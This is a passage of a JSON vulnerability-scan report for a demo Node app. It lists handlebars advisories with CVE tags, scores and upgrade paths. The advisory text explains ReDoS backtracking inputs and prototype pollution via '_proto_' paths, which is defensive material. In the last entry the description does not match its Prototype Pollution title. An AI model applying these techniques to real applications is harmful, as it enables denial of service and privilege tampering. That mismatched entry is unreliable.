\"https://github.com/wycats/handlebars.js/commit/7b67a29a8c926b38af265c727ff6551fbb277111\"\n    },\n    {\n      \"title\": \"GitHub Issue\",\n      \"url\": \"https://github.com/wycats/handlebars.js/issues/1558\"\n    },\n    {\n      \"title\": \"Reference\",\n      \"url\": \"https://www.npmjs.com/advisories/1164\"\n    },\n    {\n      \"title\": \"Release Notes\",\n      \"url\": \"https://github.com/wycats/handlebars.js/blob/master/release-notes.md%23v430---september-24th-2019\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \">=4.0.0 <4.3.0\",\n      \"<3.8.0\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Prototype Pollution\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"hbs@4.0.4\",\n    \"handlebars@4.0.14\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"hbs@4.0.5\",\n    \"handlebars@4.3.3\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"handlebars\",\n  \"version\": \"4.0.14\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , hbs@4.0.4 , handlebars@4.0.14 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-reports@1.4.0 , handlebars@4.0.11 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [
              "2019-20922"
            ],
            "ghsaid": [
              "f52g-6jhx-586p"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Denial of Service (DoS)",
          "id": "SNYK-JS-HANDLEBARS-480388",
          "desc": "## Overview\n[handlebars](https://www.npmjs.com/package/handlebars) is an extension to the Mustache templating language.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS). The package's parser may be forced into an endless loop while processing specially-crafted templates, which may allow attackers to exhaust system resources leading to Denial of Service.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `handlebars` to version 4.4.5 or higher.\n## References\n- [GitHub Commit](https://github.com/wycats/handlebars.js/commit/8d5530ee2c3ea9f0aee3fde310b9f36887d00b8b)\n- [GitHub Issue](https://github.com/wycats/handlebars.js/issues/1579)\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1300)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2019-11-05T12:16:29.016014Z\",\n  \"credit\": [\n    \"Unknown\"\n  ],\n  \"cvssScore\": 7.5,\n  \"description\": \"## Overview\\n[handlebars](https://www.npmjs.com/package/handlebars) is an extension to the Mustache templating language.\\n\\nAffected versions of this package are vulnerable to Denial of Service (DoS). The package's parser may be forced into an endless loop while processing specially-crafted templates, which may allow attackers to exhaust system resources leading to Denial of Service.\\n\\n## Details\\n\\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\\n\\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\\n\\nLet’s take the following regular expression as an example:\\n```js\\nregex = /A(B|C+)+D/\\n```\\n\\nThis regular expression accomplishes the following:\\n- `A` The string must start with the letter 'A'\\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\\n- `D` Finally, we ensure this section of the string ends with a 'D'\\n\\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\\n\\nIt most cases, it doesn't take very long for a regex engine to find a match:\\n\\n```bash\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\\\")'\\n0.04s user 0.01s system 95% cpu 0.052 total\\n\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\\\")'\\n1.79s user 0.02s system 99% cpu 1.812 total\\n```\\n\\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\\n\\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\\n\\nLet's look at how our expression runs into this problem, using a shorter string: \\\"ACCCX\\\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\\n1. CCC\\n2. CC+C\\n3. C+CC\\n4. C+C+C.\\n\\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\\n\\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\\n\\n| String | Number of C's | Number of steps |\\n| -------|-------------:| -----:|\\n| ACCCX | 3 | 38\\n| ACCCCX | 4 | 71\\n| ACCCCCX | 5 | 136\\n| ACCCCCCCCCCCCCCX | 14 | 65,553\\n\\n\\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\\n\\n## Remediation\\nUpgrade `handlebars` to version 4.4.5 or higher.\\n## References\\n- [GitHub Commit](https://github.com/wycats/handlebars.js/commit/8d5530ee2c3ea9f0aee3fde310b9f36887d00b8b)\\n- [GitHub Issue](https://github.com/wycats/handlebars.js/issues/1579)\\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1300)\\n\",\n  \"disclosureTime\": \"2019-10-30T15:57:14Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"4.4.5\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-HANDLEBARS-480388\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2019-20922\"\n    ],\n    \"CWE\": [\n      \"CWE-400\"\n    ],\n    \"GHSA\": [\n      \"GHSA-f52g-6jhx-586p\"\n    ],\n    \"NSP\": [\n      \"1300\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2022-02-11T09:51:32.219466Z\",\n  \"moduleName\": \"handlebars\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"handlebars\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2019-11-05T12:19:43Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/wycats/handlebars.js/commit/8d5530ee2c3ea9f0aee3fde310b9f36887d00b8b\"\n    },\n    {\n      \"title\": \"GitHub Issue\",\n      \"url\": \"https://github.com/wycats/handlebars.js/issues/1579\"\n    },\n    {\n      \"title\": \"NPM Security Advisory\",\n      \"url\": \"https://www.npmjs.com/advisories/1300\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \">=4.0.0 <4.4.5\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Denial of Service (DoS)\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"hbs@4.0.4\",\n    \"handlebars@4.0.14\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"hbs@4.1.0\",\n    \"handlebars@4.5.3\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"handlebars\",\n  \"version\": \"4.0.14\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , hbs@4.0.4 , handlebars@4.0.14 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-reports@1.4.0 , handlebars@4.0.11 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "94"
            ],
            "cveid": [
              "2019-20920"
            ],
            "ghsaid": [
              "2cf5-4w76-r9qv",
              "q2c6-c6pm-g3gh"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Arbitrary Code Execution",
          "id": "SNYK-JS-HANDLEBARS-534478",
          "desc": "## Overview\n[handlebars](https://www.npmjs.com/package/handlebars) is an extension to the Mustache templating language.\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution. The package's lookup helper doesn't validate templates correctly, allowing attackers to submit templates that execute arbitrary JavaScript in the system.\n## Remediation\nUpgrade `handlebars` to version 4.5.3, 3.0.8 or higher.\n## References\n- [NPM Security Advisory #1](https://www.npmjs.com/advisories/1316)\n- [NPM Security Advisory #2](https://www.npmjs.com/advisories/1324)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:L\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2019-11-15T15:45:34.906048Z\",\n  \"credit\": [\n    \"Francois Lajeunesse-Robert\"\n  ],\n  \"cvssScore\": 8.1,\n  \"description\": \"## Overview\\n[handlebars](https://www.npmjs.com/package/handlebars) is an extension to the Mustache templating language.\\n\\nAffected versions of this package are vulnerable to Arbitrary Code Execution. The package's lookup helper doesn't validate templates correctly, allowing attackers to submit templates that execute arbitrary JavaScript in the system.\\n## Remediation\\nUpgrade `handlebars` to version 4.5.3, 3.0.8 or higher.\\n## References\\n- [NPM Security Advisory #1](https://www.npmjs.com/advisories/1316)\\n- [NPM Security Advisory #2](https://www.npmjs.com/advisories/1324)\\n\",\n  \"disclosureTime\": \"2019-11-14T15:29:41Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"4.5.3\",\n    \"3.0.8\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-HANDLEBARS-534478\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2019-20920\"\n    ],\n    \"CWE\": [\n      \"CWE-94\"\n    ],\n    \"GHSA\": [\n      \"GHSA-2cf5-4w76-r9qv\",\n      \"GHSA-q2c6-c6pm-g3gh\"\n    ],\n    \"NSP\": [\n      \"1316\",\n      \"1324\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2022-02-11T12:35:29.725892Z\",\n  \"moduleName\": \"handlebars\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"handlebars\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2019-11-15T15:48:43Z\",\n  \"references\": [\n    {\n      \"title\": \"NPM Security Advisory #1\",\n      \"url\": \"https://www.npmjs.com/advisories/1316\"\n    },\n    {\n      \"title\": \"NPM Security Advisory #2\",\n      \"url\": \"https://www.npmjs.com/advisories/1324\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \">=4.0.0 <4.5.3\",\n      \"<3.0.8\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Arbitrary Code Execution\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"hbs@4.0.4\",\n    \"handlebars@4.0.14\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"hbs@4.1.0\",\n    \"handlebars@4.5.3\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"handlebars\",\n  \"version\": \"4.0.14\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , hbs@4.0.4 , handlebars@4.0.14 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-reports@1.4.0 , handlebars@4.0.11 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [],
            "ghsaid": [
              "g9r4-xpmj-mj65"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Prototype Pollution",
          "id": "SNYK-JS-HANDLEBARS-534988",
          "desc": "## Overview\n\n[handlebars](https://www.npmjs.com/package/handlebars) is an extension to the Mustache templating language.\n\n\nAffected versions of this package are vulnerable to Prototype Pollution.\nIt is possible to add or modify properties to the Object prototype through a malicious template. This may allow attackers to crash the application or execute Arbitrary Code in specific conditions.\n\n## Details\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\r\n\r\nThere are two main ways in which the pollution of prototypes occurs:\r\n\r\n-   Unsafe `Object` recursive merge\r\n    \r\n-   Property definition by path\r\n    \r\n\r\n### Unsafe Object recursive merge\r\n\r\nThe logic of a vulnerable recursive merge function follows the following high-level model:\r\n```\r\nmerge (target, source)\r\n\r\n  foreach property of source\r\n\r\n    if property exists and is an object on both the target and the source\r\n\r\n      merge(target[property], source[property])\r\n\r\n    else\r\n\r\n      target[property] = source[property]\r\n```\r\n<br>  \r\n\r\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\r\n\r\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\r\n\r\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\r\n\r\n### Property definition by path\r\n\r\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\r\n\r\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\r\n\r\n## Types of attacks\r\n\r\nThere are a few methods by which Prototype Pollution can be manipulated:\r\n\r\n| Type |Origin  |Short description |\r\n|--|--|--|\r\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\r\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\r\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\r\n\r\n## Affected environments\r\n\r\nThe following environments are susceptible to a Prototype Pollution attack:\r\n\r\n-   Application server\r\n    \r\n-   Web server\r\n    \r\n\r\n## How to prevent\r\n\r\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\r\n    \r\n2.  Require schema validation of JSON input.\r\n    \r\n3.  Avoid using unsafe recursive merge functions.\r\n    \r\n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\r\n    \r\n5.  As a best practice use `Map` instead of `Object`.\r\n\r\n### For more information on this vulnerability type:\r\n\r\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\n\nUpgrade `handlebars` to version 4.5.3, 3.0.8 or higher.\n\n\n## References\n\n- [GitHub Commit](https://github.com/wycats/handlebars.js/commit/198887808780bbef9dba67a8af68ece091d5baa7)\n\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1325)\n",
          "impact": 0,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2019-11-20T09:54:27.277624Z\",\n  \"credit\": [\n    \"Vladyslav Babkin\"\n  ],\n  \"cvssScore\": 9.8,\n  \"description\": \"## Overview\\n\\n[handlebars](https://www.npmjs.com/package/handlebars) is an extension to the Mustache templating language.\\n\\n\\nAffected versions of this package are vulnerable to Prototype Pollution.\\nIt is possible to add or modify properties to the Object prototype through a malicious template. This may allow attackers to crash the application or execute Arbitrary Code in specific conditions.\\n\\n## Details\\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\\r\\n\\r\\nThere are two main ways in which the pollution of prototypes occurs:\\r\\n\\r\\n-   Unsafe `Object` recursive merge\\r\\n    \\r\\n-   Property definition by path\\r\\n    \\r\\n\\r\\n### Unsafe Object recursive merge\\r\\n\\r\\nThe logic of a vulnerable recursive merge function follows the following high-level model:\\r\\n```\\r\\nmerge (target, source)\\r\\n\\r\\n  foreach property of source\\r\\n\\r\\n    if property exists and is an object on both the target and the source\\r\\n\\r\\n      merge(target[property], source[property])\\r\\n\\r\\n    else\\r\\n\\r\\n      target[property] = source[property]\\r\\n```\\r\\n<br>  \\r\\n\\r\\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\\r\\n\\r\\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\\r\\n\\r\\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\\r\\n\\r\\n### Property definition by path\\r\\n\\r\\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\\r\\n\\r\\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\\r\\n\\r\\n## Types of attacks\\r\\n\\r\\nThere are a few methods by which Prototype Pollution can be manipulated:\\r\\n\\r\\n| Type |Origin  |Short description |\\r\\n|--|--|--|\\r\\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\\r\\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\\r\\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\\r\\n\\r\\n## Affected environments\\r\\n\\r\\nThe following environments are susceptible to a Prototype Pollution attack:\\r\\n\\r\\n-   Application server\\r\\n    \\r\\n-   Web server\\r\\n    \\r\\n\\r\\n## How to prevent\\r\\n\\r\\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\\r\\n    \\r\\n2.  Require schema validation of JSON input.\\r\\n    \\r\\n3.  Avoid using unsafe recursive merge functions.\\r\\n    \\r\\n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\\r\\n    \\r\\n5.  As a best practice use `Map` instead of `Object`.\\r\\n\\r\\n### For more information on this vulnerability type:\\r\\n\\r\\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\\n\\n## Remediation\\n\\nUpgrade `handlebars` to version 4.5.3, 3.0.8 or higher.\\n\\n\\n## References\\n\\n- [GitHub Commit](https://github.com/wycats/handlebars.js/commit/198887808780bbef9dba67a8af68ece091d5baa7)\\n\\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1325)\\n\",\n  \"disclosureTime\": \"2019-11-18T19:42:01Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"4.5.3\",\n    \"3.0.8\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-HANDLEBARS-534988\",\n  \"identifiers\": {\n    \"CVE\": [],\n    \"CWE\": [\n      \"CWE-400\"\n    ],\n    \"GHSA\": [\n      \"GHSA-g9r4-xpmj-mj65\"\n    ],\n    \"NSP\": [\n      \"1325\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2021-02-07T10:34:40.084216Z\",\n  \"moduleName\": \"handlebars\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"handlebars\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2019-11-20T09:55:17Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/wycats/handlebars.js/commit/198887808780bbef9dba67a8af68ece091d5baa7\"\n    },\n    {\n      \"title\": \"NPM Security Advisory\",\n      \"url\": \"https://www.npmjs.com/advisories/1325\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \">=4.0.0 <4.5.3\",\n      \"<3.0.8\"\n    ]\n  },\n  \"severity\": \"critical\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Prototype Pollution\",\n  \"severityWithCritical\": \"critical\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"hbs@4.0.4\",\n    \"handlebars@4.0.14\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"hbs@4.1.0\",\n    \"handlebars@4.5.3\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"handlebars\",\n  \"version\": \"4.0.14\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , hbs@4.0.4 , handlebars@4.0.14 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-reports@1.4.0 , handlebars@4.0.11 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Prototype Pollution",
          "id": "SNYK-JS-HANDLEBARS-567742",
          "desc": "## Overview\n[handlebars](https://www.npmjs.com/package/handlebars) is an extension to the Mustache templating language.\n\nAffected versions of this package are vulnerable to Prototype Pollution. Prototype access to the template engine allows for potential code execution.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. 